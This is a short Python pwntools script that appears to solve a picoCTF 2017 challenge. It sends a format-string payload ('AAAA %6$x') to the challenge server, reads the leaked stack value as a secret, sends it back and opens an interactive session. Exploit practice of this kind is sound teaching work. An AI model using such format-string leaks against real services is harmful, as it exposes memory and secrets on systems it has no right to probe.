#!/usr/bin/env python2

from pwn import * 

HOST = 'shell2017.picoctf.com'
PORT = 58570

local = False
#local = True

if local:
    conn = process("./secret")
else:
    conn = remote(HOST, PORT)

elf = ELF("./secret")

context.log_level = 'debug'

if local:
    gdb.attach(conn)

print conn.recv(1024)

#conn.sendline("AAAA,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x")
conn.sendline("AAAA %6$x")

m = conn.recv(1024)
secret = m[5:13]
print "[+] secret = %s" % secret

conn.sendline(secret)

print conn.recv(1024)

conn.interactive()
